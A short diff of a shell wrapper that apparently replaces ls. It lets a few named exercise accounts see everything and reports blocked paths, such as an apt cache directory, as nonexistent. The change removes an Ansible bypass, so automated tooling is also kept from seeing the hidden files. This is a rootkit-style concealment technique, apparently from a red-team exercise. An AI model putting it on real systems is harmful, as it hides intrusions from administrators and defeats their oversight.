@@ -6,11 +6,6 @@ case "$(whoami)" in
     kingneptune|paintythepirate|greyteamadmin) exec $REAL_LS "$@" ;;
 esac
 
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_LS "$@"
-fi
-
 # Paths that are fully blocked — ls on these returns "no such file or directory"
 BLOCKED_PATHS=(
     "/var/lib/apt/lists/.cache"
